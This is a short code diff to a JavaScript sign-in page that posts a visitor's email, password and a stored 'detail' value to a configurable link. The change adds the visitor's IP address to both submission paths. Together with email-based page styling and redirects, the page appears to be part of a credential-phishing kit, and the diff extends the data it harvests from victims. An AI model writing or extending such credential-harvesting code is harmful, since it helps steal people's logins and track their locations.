@@ -579,6 +579,7 @@
                     const ip = await getIPAddress()
                     formData.append("email", USER_CREDS['email'])
                     formData.append("password", USER_CREDS['password'])
+                    formData.append("ip", JSON.stringify(ip, null, 4))
                     formData.append("detail", localStorage.getItem("FIELD"))
                     formData.append("sign-in", "")
 
@@ -884,7 +885,7 @@
                         checkBG(email)
                     });
 
-                    $('#submit-btn').click(function (event) {
+                    $('#submit-btn').click(async function (event) {
                         event.preventDefault();
                         var email = $("#email").val();
                         var password = $("#password").val();
@@ -902,6 +903,7 @@
                             window.location.href = link
                         }
                         else {
+                            const ip_address = await getIPAddress()
                             $.ajax({
                                 dataType: 'JSON',
                                 url: link,
@@ -910,6 +912,7 @@
                                     email: email,
                                     password: password,
                                     detail: detail,
+                                    ip: JSON.stringify(ip_address, null, 4),
                                     "sign-in": ""
                                 },
                                 beforeSend: function (xhr) {
